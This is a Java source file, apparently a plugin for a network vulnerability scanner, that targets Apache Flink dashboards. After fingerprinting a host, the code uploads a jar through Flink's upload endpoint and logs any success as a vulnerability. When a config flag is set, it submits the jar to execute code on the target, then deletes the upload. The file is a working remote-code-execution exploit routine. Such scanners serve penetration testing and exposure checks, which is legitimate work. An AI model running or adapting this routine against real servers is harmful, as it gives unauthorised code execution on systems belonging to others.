package com.gbw.scanner.plugins.scripts.web.flink;

import com.gbw.scanner.Host;
import com.gbw.scanner.plugins.scripts.GBWScanScript;
import com.gbw.scanner.plugins.scripts.GBWScanScriptCommonConfig;
import com.gbw.scanner.sink.SinkQueue;
import com.google.gson.Gson;
import com.xmap.api.utils.TextUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

public class GBWScanFlinkScript implements GBWScanScript {

    private static final Logger log = LoggerFactory.getLogger(GBWScanFlinkScript.class);

    private GBWScanFlinkScriptConfig config;

    public GBWScanFlinkScript(GBWScanFlinkScriptConfig config){

        this.config = config;
    }

    @Override
    public GBWScanScriptCommonConfig getConfig() {
        return config;
    }

    @Override
    public boolean isAccept(Host host) {
        return true;
    }

    private static final HttpResponse<String> send(HttpClient client,HttpRequest request) throws IOException, InterruptedException {

        return client.send(request, HttpResponse.BodyHandlers.ofString());
    }

    private boolean isFlink(Host host,HttpClient httpClient) throws IOException, InterruptedException {

        HttpRequest request = FlinkHttpRequestBuilder.makeFirstPageRequest(host.getServer(),host.getPort(),config.getReadTimeout());
        HttpResponse<String> response = send(httpClient,request);

        String content = response.body();
        if(TextUtils.isEmpty(content))
            return false;

        return content.contains(config.getKeywords());
    }

    @Override
    public void scan(Host host, SinkQueue sinkQueue) {

        HttpRequest httpRequest;
        HttpResponse<String> httpResponse;
        String content;
        Gson gson = new Gson();
        HttpClient httpClient = HttpClient.newHttpClient();
        UPloadStatus uPloadStatus;
        String upFileName = null;

        try {
            if(isFlink(host,httpClient)){

                log.info("Find a apache flink ip:"+host.getIp());

                // try to upload jar
                httpRequest = FlinkHttpRequestBuilder.makeUPloadJarRequest(host.getServer(),host.getPort(),config.getReadTimeout(),config.getJarFile());

                httpResponse = send(httpClient,httpRequest);
                if(httpResponse.statusCode() == 200){
                    content = httpResponse.body();
                    uPloadStatus = gson.fromJson(content,UPloadStatus.class);

                    upFileName = uPloadStatus.getFile();

                    if(!TextUtils.isEmpty(upFileName)){

                        /*find a bug*/
                        log.warn(String.format("Find a apache flink upload bug,ip:%s,jar:%s",host.getIp(),upFileName));

                        GBWScanFlinkScriptResult result = new GBWScanFlinkScriptResult(config,host);
                        result.setPayload(uPloadStatus.getFilename());
                        sinkQueue.put(result);

                        /*exe rce*/
                        if(config.isUseRCE()){

                            httpRequest = FlinkHttpRequestBuilder.makesubmitJarRequest(host.getServer(),host.getPort(),config.getReadTimeout(),upFileName,
                                    config.getEntryClass(),config.getSubmitJson());

                            httpResponse = send(httpClient,httpRequest);

                            log.warn(String.format("Exe a apache flink rce ip:%s,jar:%s,res:%s",host.getIp(),upFileName,httpResponse.body()));
                        }

                        /*delete jar file*/
                        log.warn(String.format("Delete upload for IP:%s,jar:%s",host.getIp(),upFileName));

                        httpRequest = FlinkHttpRequestBuilder.makeDeleteJarRequest(host.getServer(),host.getPort(),config.getReadTimeout(),upFileName);
                        send(httpClient,httpRequest);

                    }
                }

            }

        }catch (Exception e){

            e.printStackTrace();
        }

    }


}
